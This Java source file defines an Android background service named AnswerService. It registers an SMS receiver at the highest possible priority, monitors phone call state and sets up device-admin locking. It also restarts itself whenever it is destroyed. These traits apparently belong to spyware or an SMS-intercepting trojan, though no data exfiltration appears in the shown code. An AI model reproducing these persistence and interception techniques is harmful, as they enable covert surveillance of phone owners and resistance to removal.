package com.yfm.answer;

import java.io.File;

import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

public class AnswerService extends Service {

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		this.unregisterReceiver(receiver);
		Intent intent=new Intent(this, AnswerService.class);
		this.startService(intent);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		return START_STICKY;
	}

	public static File file;
	private TelephonyManager tm;
	private TelePhoneListener tpl;
	public static DevicePolicyManager policyManager;
	public static ComponentName componentName;
	private BootBroadcastReceiver receiver;
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		file=new File(Environment.getExternalStorageDirectory()+"/answer");
		if(!file.exists()){
			file.mkdirs();
		}
		receiver=new BootBroadcastReceiver();
		IntentFilter filter=new IntentFilter();
		filter.addAction("android.provider.Telephony.SMS_RECEIVED");
		filter.setPriority(2147483647);
		this.registerReceiver(receiver, filter);
		
        tm=(TelephonyManager)this.getSystemService(Context.TELEPHONY_SERVICE);
		tpl=new TelePhoneListener(this);
		tm.listen(tpl, PhoneStateListener.LISTEN_CALL_STATE);
		policyManager = (DevicePolicyManager) this.getSystemService(Context.DEVICE_POLICY_SERVICE);
		componentName = new ComponentName(this.getApplicationContext(), LockReceiver.class); 
	}

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}



}
